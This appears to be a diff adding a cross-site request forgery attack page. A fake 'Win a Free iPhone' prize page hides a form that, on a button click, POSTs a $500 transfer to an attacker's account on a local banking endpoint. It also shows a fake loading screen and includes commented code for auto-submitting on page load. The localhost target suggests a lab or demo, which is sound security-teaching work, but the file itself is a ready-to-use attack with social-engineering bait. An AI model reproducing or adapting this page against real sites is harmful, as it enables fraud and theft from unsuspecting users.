@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Win a Free iPhone!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        h1 {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+        button {
+            padding: 20px 40px;
+            font-size: 24px;
+            background-color: #ffd700;
+            color: #333;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover {
+            background-color: #ffed4e;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>🎉 Congratulations!</h1>
+    <h2>You've Won a FREE iPhone 15 Pro!</h2>
+    <p style="font-size: 20px; margin: 30px 0;">
+        Click the button below to claim your prize!
+    </p>
+    
+    <!-- Hidden malicious form -->
+    <form 
+        id="maliciousForm" 
+        action="http://127.0.0.1:5000/transfer" 
+        method="POST" 
+        class="hidden"
+    >
+
+        <!-- Transfer $500 to attacker's account -->
+        <input type="hidden" name="to_account" value="ACC-1004">
+        <input type="hidden" name="amount" value="500">
+        <input type="hidden" name="description" value="Prize claim fee">
+    </form>
+    
+    <button onclick="claimPrize()">
+        Claim My iPhone!
+    </button>
+    
+    <script>
+        function claimPrize() {
+            // Automatically submit the hidden form
+            document.getElementById('maliciousForm').submit();
+            
+            // Optional: Show fake loading message
+            document.body.innerHTML = '<h1>Processing your claim...</h1><p>Please wait...</p>';
+        }
+        
+        // Uncomment below to auto-submit when page loads (more dangerous!)
+        // window.onload = function() {
+        //     setTimeout(function() {
+        //         document.getElementById('maliciousForm').submit();
+        //     }, 1000);
+        // };
+    </script>
+</body>
+</html>
